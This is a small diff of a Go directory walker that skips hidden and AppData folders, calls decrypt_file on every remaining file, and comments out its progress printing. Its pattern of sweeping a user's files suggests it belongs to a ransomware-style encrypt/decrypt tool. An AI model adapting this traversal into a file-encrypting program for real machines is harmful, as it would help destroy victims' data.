@@ -90,15 +90,15 @@ func explore_directory(parent_dir string) {
 	err := filepath.WalkDir(parent_dir, func(file_path string, element fs.DirEntry, err error) error {
 		if element.IsDir() { // it's a folder element, not a file element
 			if strings.HasPrefix(element.Name(), ".") { // skip folders with .
-				fmt.Println("Skipping directory:", file_path)
+				// fmt.Println("Skipping directory:", file_path)
 				return filepath.SkipDir
 			}
 			if strings.HasPrefix(element.Name(), "AppData") { // skip AppData folder
-				fmt.Println("Skipping directory:", file_path)
+				// fmt.Println("Skipping directory:", file_path)
 				return filepath.SkipDir
 			}
 			// other directories
-			fmt.Println("Exploring directory:", file_path)
+			// fmt.Println("Exploring directory:", file_path)
 		} else { // it's a file
 			decrypt_file(file_path)
 		}
